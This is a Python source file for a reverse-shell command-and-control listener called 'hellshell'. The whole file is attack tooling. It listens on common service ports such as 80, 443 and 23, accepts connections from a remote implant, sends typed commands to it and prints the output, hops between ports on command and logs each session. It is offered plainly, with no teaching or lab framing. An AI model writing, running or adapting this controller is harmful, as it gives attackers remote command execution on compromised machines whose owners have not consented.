import socket
import time
from datetime import datetime as dt
import os

HOST = "0.0.0.0"  # all local IPs
ports = [80, 8080, 443, 20, 21, 23]
PORT = ports[0]
BUFFER = 1024

KILLSTRING = "endme"
HOP_STRING = "porthop"
INFO_QUERY = "informationquery"

PROMPT = "$ "

def nextPort(p):
	global ports
	i = ports.index(p)
	if i == 5:
		return ports[0]
	return ports[i+1]

if "hellshell_logs" not in os.listdir():
	os.mkdir("hellshell_logs")

logfile = "hellshell_logs/" + dt.now().strftime("%m_%d%H_%M") + ".log"
logger = open(logfile, 'w')
open_conn = False
while True:
	try:
		if not open_conn:
			logger.write("Opening socket!\n")
			s = socket.socket()
			s.settimeout(60)
			s.bind((HOST, PORT))
			print("Ready for connections on " + str(PORT))
			logger.write("Ready for connections on " + str(PORT) + "\n")
			PORT = nextPort(PORT)
			s.listen(1)
			conn, raddr = s.accept()
			open_conn = True
			print("Getting system information...")
			logger.write("Getting system information: ")
			time.sleep(1)
			conn.send(INFO_QUERY.encode())
			conn.recv(BUFFER).decode()
			PROMPT = conn.recv(BUFFER).decode()
			logger.write(PROMPT + "\n")

		cmd = input(PROMPT)
		logger.write(PROMPT + cmd + "\n")
		conn.send(cmd.encode())
		
		if cmd == HOP_STRING:
			print("Changing ports...")
			logger.write("Changing ports...\n")
			conn.shutdown(1)
			conn.close()
			s.close()
			open_conn = False
		elif cmd == KILLSTRING:
			conn.shutdown(1)
			conn.close()
			s.close()
			break
		else:
			sz = conn.recv(BUFFER).decode()
			rsp = conn.recv(int(sz)).decode()
			if INFO_QUERY == rsp[0:len(INFO_QUERY)]:
				PROMPT = rsp[len(INFO_QUERY)::]
			else:
				print(rsp)
				logger.write(rsp + "\n")
	except Exception as e:
		print(e)
		logger.write("EXCEPTION CAUGHT: " + str(e) + "\n")
		open_conn = False
		time.sleep(1)
		
logger.close()
print("Session logged to " + logfile + ".\nGoodbye")
